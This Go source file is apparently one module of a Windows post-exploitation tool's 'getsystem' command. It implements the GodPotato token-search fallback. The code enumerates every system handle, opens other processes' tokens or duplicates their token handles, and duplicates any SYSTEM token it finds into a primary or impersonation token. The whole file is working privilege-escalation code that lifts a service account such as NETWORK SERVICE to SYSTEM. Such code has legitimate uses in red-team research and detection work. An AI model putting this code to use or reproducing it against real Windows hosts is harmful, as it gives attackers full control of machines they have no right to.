//go:build windows
// +build windows

// getsystem_potato_token.go contains the SYSTEM token search fallback used when
// the pipe client is not SYSTEM (e.g., NETWORK SERVICE on Win11 23H2+).
// This implements the GodPotato handle enumeration strategy.

package commands

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// searchSystemTokenViaHandles implements the GodPotato token search fallback.
// When the pipe client is not SYSTEM (e.g., NETWORK SERVICE on Win11 23H2),
// this function enumerates all system handles to find a SYSTEM token.
// Must be called while impersonating the pipe client (for any additional access
// the impersonated identity may provide).
func searchSystemTokenViaHandles() (windows.Token, string, error) {
	systemSID, _ := windows.StringToSid("S-1-5-18")
	myPID := uint32(syscall.Getpid())
	myProcess, _ := windows.GetCurrentProcess()

	// Enumerate all system handles
	entries, err := querySystemHandles()
	if err != nil {
		return 0, "", fmt.Errorf("querySystemHandles: %w", err)
	}

	// Group by PID and track which PIDs we've tried
	triedPIDs := make(map[uint32]bool)
	var found windows.Token
	var foundInfo string

	// First pass: try OpenProcess + OpenProcessToken on each unique PID.
	// This is the simplest approach — if we can open the process and its token
	// is SYSTEM, we can duplicate it directly.
	for _, entry := range entries {
		pid := entry.OwnerPID
		if pid == 0 || pid == 4 || pid == myPID || triedPIDs[pid] {
			continue
		}
		triedPIDs[pid] = true

		hProc, procErr := windows.OpenProcess(
			PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
		if procErr != nil {
			continue
		}

		var tok windows.Token
		tokErr := windows.OpenProcessToken(hProc, TOKEN_QUERY|TOKEN_DUPLICATE, &tok)
		windows.CloseHandle(hProc)
		if tokErr != nil {
			continue
		}

		tu, tuErr := tok.GetTokenUser()
		if tuErr != nil || !tu.User.Sid.Equals(systemSID) {
			tok.Close()
			continue
		}

		// Found a SYSTEM token — duplicate it
		var dupTok windows.Token
		dupErr := windows.DuplicateTokenEx(tok, windows.MAXIMUM_ALLOWED, nil,
			windows.SecurityDelegation, windows.TokenPrimary, &dupTok)
		if dupErr != nil {
			dupErr = windows.DuplicateTokenEx(tok, windows.MAXIMUM_ALLOWED, nil,
				windows.SecurityImpersonation, windows.TokenImpersonation, &dupTok)
		}
		tok.Close()
		if dupErr != nil {
			continue
		}

		found = dupTok
		foundInfo = fmt.Sprintf("process token (PID %d)", pid)
		break
	}

	if found != 0 {
		return found, foundInfo, nil
	}

	// Second pass: try DuplicateHandle on individual token handles.
	// Some processes may hold SYSTEM token handles even if we can't open
	// the process's own token. We duplicate each handle and check the token.
	triedPIDs = make(map[uint32]bool) // reset for process handle cache
	var processHandleCache = make(map[uint32]windows.Handle)
	defer func() {
		for _, h := range processHandleCache {
			windows.CloseHandle(h)
		}
	}()

	for _, entry := range entries {
		pid := entry.OwnerPID
		if pid == 0 || pid == 4 || pid == myPID {
			continue
		}

		// Try to open the owning process (cache the handle)
		if _, ok := processHandleCache[pid]; !ok {
			if triedPIDs[pid] {
				continue
			}
			triedPIDs[pid] = true
			hProc, procErr := windows.OpenProcess(
				processDupHandle|PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
			if procErr != nil {
				continue
			}
			processHandleCache[pid] = hProc
		}

		hProc := processHandleCache[pid]

		// Skip handles with GrantedAccess that commonly cause hangs
		if entry.GrantedAccess == 0x0012019f {
			continue
		}

		// Try to duplicate the handle into our process
		var dupHandle windows.Handle
		ret, _, _ := procNtDuplicateObjHandles.Call(
			uintptr(hProc),
			uintptr(entry.HandleValue),
			uintptr(myProcess),
			uintptr(unsafe.Pointer(&dupHandle)),
			uintptr(TOKEN_QUERY|TOKEN_DUPLICATE),
			0, // no inherit
			0, // no options (don't close source)
		)
		if ret != 0 || dupHandle == 0 {
			continue
		}

		// Check if this is a token by trying GetTokenUser
		tok := windows.Token(dupHandle)
		tu, tuErr := tok.GetTokenUser()
		if tuErr != nil {
			windows.CloseHandle(dupHandle)
			continue
		}

		if !tu.User.Sid.Equals(systemSID) {
			tok.Close()
			continue
		}

		// Found a SYSTEM token handle — duplicate it properly
		var finalTok windows.Token
		dupErr := windows.DuplicateTokenEx(tok, windows.MAXIMUM_ALLOWED, nil,
			windows.SecurityDelegation, windows.TokenPrimary, &finalTok)
		if dupErr != nil {
			dupErr = windows.DuplicateTokenEx(tok, windows.MAXIMUM_ALLOWED, nil,
				windows.SecurityImpersonation, windows.TokenImpersonation, &finalTok)
		}
		tok.Close()
		if dupErr != nil {
			continue
		}

		return finalTok, fmt.Sprintf("handle dup (PID %d, handle 0x%x)", pid, entry.HandleValue), nil
	}

	return 0, "", fmt.Errorf("no SYSTEM token found via handle enumeration (%d handles, %d unique PIDs)", len(entries), len(triedPIDs))
}
